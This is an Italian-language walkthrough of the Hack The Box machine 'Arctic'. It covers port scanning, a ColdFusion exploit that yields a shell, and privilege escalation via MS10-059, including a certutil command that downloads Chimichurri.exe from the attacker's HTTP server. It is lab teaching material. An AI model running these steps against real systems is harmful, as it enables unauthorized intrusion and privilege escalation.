# Arctic

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con _nmapAutomator_.

```text
sudo ./nmapAutomator.sh --host 0.0.0.0 --type All
```

Il risultato della scansione è il seguente:

```text
Running all scans on 10.10.14.1

Host is likely running Linux


---------------------Starting Port Scan-----------------------

PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown


---------------------Starting Script Scan-----------------------

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows



---------------------Starting Full Scan------------------------

PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

No new ports


----------------------Starting UDP Scan------------------------

No UDP ports are open


---------------------Starting Vulns Scan-----------------------

Running CVE scan on all ports

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Running Vuln scan on all ports
This may take a while, depending on the number of detected services..

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


---------------------Recon Recommendations---------------------

No Recon Recommendations found...


---------------------Finished all scans------------------------

Completed in 12 minute(s) and 46 second(s)
```

Passo quindi alla fase successiva.


## Enumeration
Visito la pagina http://10.10.10.11:8500/:

<p align="center">
  <img src="/Immagini/Windows-Box/Arctic/arctic-1.png"/>
</p>

Per fare ogni richiesta impiega circa 20 secondi, quindi prima di utilizzare un tool come _gobuster_ o _dirsearch_ provo a scoprire qualcosa "manualmente".

Navigando trovo la pagina http://10.10.10.11:8500/CFIDE/administrator/:

<p align="center">
  <img src="/Immagini/Windows-Box/Arctic/arctic-2.png"/>
</p>

Utilizzo _searchsploit_ per trovare delle vulnerabilità:

<p align="center">
  <img src="/Immagini/Windows-Box/Arctic/arctic-3.png"/>
</p>

## Exploitation
Tra queste provo con la 50057. Modifico il file inserendo i valori giusti relativi al mio indirizzo ip e a quello della macchina vittima ed eseguo il codice in python ottenendo una shell:

<p align="center">
  <img src="/Immagini/Windows-Box/Arctic/arctic-4.png"/>
</p>

**Inoltre, nella cartella dell'utente _tolis_, trovo il primo flag!**


## Privilege Escalation

Utilizzo Windows Exploit Suggester per identificare delle patch mancanti che possono permettere di scalare privilegi.

Per prima cosa aggiorno il database:

```text
python2 windows-exploit-suggester.py --update
```

Copio il risultato del comando _systeminfo_ eseguito sulla macchina vittima e lo salvo all'interno del file _systeminfo.txt_.

Poi lancio l'exploit suggester:

```text
python2 windows-exploit-suggester.py --database 2024-01-08-mssb.xls --systeminfo systeminfo.txt
```

Ottengo il seguente risultato:

<p align="center">
  <img src="/Immagini/Windows-Box/Arctic/arctic-5.png"/>
</p>

Quindi ci sono diverse possibilità per poter scalare.

Facendo una rapida ricerca mi imbatto in questo [repository](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059%3A%20Chimichurri):

<p align="center">
  <img src="/Immagini/Windows-Box/Arctic/arctic-6.png"/>
</p>

Quindi avvio un server http sulla porta 8080, scarico la versione compliata del file e lo trasferisco alla macchina tramite il seguente comando:

```text
certutil -urlcache -split -f "http://10.10.14.7:8080/Chimichurri.exe" Chimichurri.exe
```

**Quindi eseguo l'exploit e sono root!**
